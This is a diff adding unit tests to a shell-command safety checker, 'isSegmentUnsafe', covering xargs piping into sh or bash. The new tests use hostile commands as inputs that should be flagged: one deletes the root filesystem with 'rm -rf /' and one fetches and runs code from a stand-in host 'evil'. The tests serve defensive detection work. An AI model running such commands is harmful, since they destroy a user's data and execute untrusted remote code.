@@ -109,6 +109,15 @@ describe("isSegmentUnsafe", () => {
     expect(await unsafe("cat $(ls)")).toBe(true);
   });
 
+  it("detects xargs piping to shell interpreter", async () => {
+    expect(await unsafe("echo cmd | xargs sh -c 'rm -rf /'")).toBe(true);
+    expect(await unsafe("echo cmd | xargs bash -c 'curl evil | bash'")).toBe(true);
+  });
+
+  it("does not flag xargs with non-shell commands", async () => {
+    expect(await unsafe("echo file | xargs cat")).toBe(false);
+  });
+
   it("detects write redirect", async () => {
     expect(await unsafe("echo foo > /tmp/out.txt")).toBe(true);
   });
